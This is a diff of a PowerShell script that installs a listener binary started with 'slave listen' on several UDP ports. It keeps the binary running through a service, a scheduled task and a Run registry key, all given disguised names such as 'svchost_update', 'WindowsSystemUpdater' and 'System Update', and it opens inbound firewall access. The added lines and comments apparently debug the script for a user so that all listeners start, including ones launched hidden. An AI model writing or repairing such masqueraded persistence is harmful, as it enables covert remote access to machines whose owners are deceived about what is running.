@@ -24,17 +24,19 @@ $regName = "WindowsSystemUpdater"
 $regPort = 6666
 
 Import-Module NetSecurity
-try { Stop-Service $svcName -Force -ErrorAction SilentlyContinue } catch {}
-try { Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue } catch {}
-try { Stop-Process -Name "svchost_update" -Force -ErrorAction SilentlyContinue } catch {}
+Stop-Service $svcName -Force
+Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
+Stop-Process -Name "svchost_update" -Force
 Start-Sleep -Seconds 1
-if (Test-Path $dest) { try { Remove-Item $dest -Force -ErrorAction SilentlyContinue } catch {} }
+if (Test-Path $dest) { try { Remove-Item $dest -Force } catch {} }
 
 Copy-Item -Path $bin -Destination $dest -Force
 
 New-NetFirewallRule -DisplayName "System Update" -Direction Inbound -Program $dest -Protocol UDP -Action Allow | Out-Null
 
 $svcArgs = "slave listen udp://*:$svcPort --ssl --key `"$Password`""
+# Service Trick: Use cmd /c to detach?
+# Actually, just use the binary. If it fails, we catch it.
 $svcBinPath = "`"$dest`" $svcArgs"
 try {
     New-Service -Name $svcName -BinaryPathName $svcBinPath -DisplayName $svcName -StartupType Automatic | Out-Null
@@ -53,6 +55,11 @@ $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 $regCmd = "`"$dest`" slave listen udp://*:$regPort --ssl --key `"$Password`""
 try { Set-ItemProperty -Path $regPath -Name $regName -Value $regCmd -Force } catch {}
 
+# --- FORCE START ALL ---
+# User complains "Only 44444 worked".
+# 6666 (Reg) won't start until login -> Start manually now.
+# 53535 (Svc) might have failed -> Start manually now.
+
 $runningPorts = Get-NetUDPEndpoint -LocalPort $svcPort, $taskPort, $regPort -ErrorAction SilentlyContinue | Select-Object -ExpandProperty LocalPort
 
 if ($runningPorts -notcontains $svcPort) {
@@ -61,6 +68,7 @@ if ($runningPorts -notcontains $svcPort) {
 if ($runningPorts -notcontains $regPort) {
     Start-Process -FilePath $dest -ArgumentList "slave listen udp://*:$regPort --ssl --key `"$Password`"" -WindowStyle Hidden
 }
+# Task usually starts fine via Start-ScheduledTask
 
 Write-Host "Service: $svcPort"
 Write-Host "Task:    $taskPort"
